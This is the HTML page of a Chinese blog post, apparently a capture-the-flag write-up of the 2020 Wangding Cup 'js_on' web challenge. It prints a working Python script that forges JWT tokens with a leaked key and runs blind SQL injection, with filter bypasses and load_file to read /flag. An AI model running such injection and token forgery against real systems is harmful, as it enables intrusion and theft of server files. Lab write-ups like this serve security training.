@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>2020年网鼎杯第四场writeup ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">2020年网鼎杯第四场writeup</p>
+            <br>
+            
+            <p>Wednesday, May 27th 2020, 8:24 am</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>听说网鼎杯玄武场的题目最有难度，于是就尝试复现一下web题目。</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="js-on"><a href="#js-on" class="headerlink" title="js_on"></a>js_on</h2><p>打开页面<br><img src="https://s1.ax1x.com/2020/05/27/tkEI2V.png" alt="tkEI2V.png"></p>
+<p>是一个登陆框，还有注册页面，在这里尝试注入：</p>
+<p><img src="https://s1.ax1x.com/2020/05/27/tkEX5R.png" alt="tkEX5R.png"><br>一开口就知道是老祖安人了，如此的儒雅随和。。。<br>注入尝试失败了，就像尝试登陆吧，尝试几次之后，发现存在弱口令<code>admin:admin</code></p>
+<p><img src="https://s1.ax1x.com/2020/05/27/tkZvjK.png" alt="tkZvjK.png"></p>
+<p>给了一个<code>key</code>。。</p>
+<p>尝试珠宝，发现了token应该是jwt。这个<code>key</code>应该是密钥。<br><img src="https://s1.ax1x.com/2020/05/27/tknMpn.png" alt="tknMpn.png"></p>
+<p>在线解密，之后发现：<br><img src="https://s1.ax1x.com/2020/05/27/tkKZGj.png" alt="tkKZGj.png"></p>
+<p>百度了一个jwt加密的脚本：<a href="https://www.cnblogs.com/lowmanisbusy/p/10930856.html" target="_blank" rel="noopener">jwt加密</a><br>测试发现可以控制user和news的参数。。</p>
+<p>尝试让user为<code>admin&#39;</code></p>
+<p>发现存在报错，猜测这里存在注入。。<br><img src="https://s1.ax1x.com/2020/05/27/tkM0cn.png" alt="tkM0cn.png"></p>
+<p>通过测试发现 这里过滤了空格，我们可以用<code>/**/</code>进行绕过。</p>
+<p>这里还过滤了<code>select</code>，尝试之后发现可以使用<code>sel&lt;&gt;ect</code>进行绕过。</p>
+<p>这里我们进行注入，发现存在<code>users</code>表，里面存储的是正常的信息，没有我们所期待的<code>flag</code>表。。</p>
+<p>尝试发现<code>load_file</code> 可以用，直接读 <code>/flag</code>.<br>脚本如下：</p>
+<pre><code># encoding=utf-8
+import time
+import jwt
+import requests
+import sys
+
+reload(sys)
+sys.setdefaultencoding(&quot;utf8&quot;)
+
+# payload
+token_dict = {
+    &quot;user&quot;: &quot;admin&#39;/**/or/**/&#39;&#39;=&#39;&quot;,
+    &quot;news&quot;: &quot;test&quot;
+}
+
+
+def jwt_enc(js):
+    headers = {
+        &#39;alg&#39;: &quot;HS256&quot;,  # 声明所使用的算法
+    }
+    jwt_token = jwt.encode(js,  # payload, 有效载体
+                           &quot;xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&amp;6&quot;,  # 进行加密签名的密钥
+                           algorithm=&quot;HS256&quot;,  # 指明签名算法方式, 默认也是HS256
+                           headers=headers  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
+                           ).decode(&#39;ascii&#39;)  # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str
+    return jwt_token
+
+
+url = &#39;http://challenge-fd0e6314e955219d.sandbox.ctfhub.com:10080/index.php&#39;
+
+flag=&quot;&quot;
+for i in range(1,60):
+    print i
+    for j in range(33,128):
+        # print j
+        data={
+        &#39;user&#39;:&quot;admin&#39;/**/and/**/(sel&lt;&gt;ect/**/ascii(mid(load_file(&#39;/flag&#39;),&quot;+str(i)+&quot;,1)))=&quot;+str(j)+&quot;/**/#&quot;,
+        &#39;news&#39;:&#39;aaa&#39;
+        }
+        # print data
+        cookie={
+        &#39;token&#39;:jwt_enc(data)
+        }
+        # print cookie
+        # exit()
+        res = requests.post(url, cookies=cookie)
+        # print res.text
+        # exit()
+        if &#39;aaa&#39; in res.text:
+            flag += chr(j)
+            print flag
+            break
+
+
+# ctfhub{23011c99d66ec70f922839df70fe5f6a7f532ef0}
+
+
+</code></pre><p>题目复现可以去ctfhub上面进行复现：<a href="https://www.ctfhub.com/#/challenge" target="_blank" rel="noopener">ctfhub</a></p>
+<p>#</p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;writeup</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
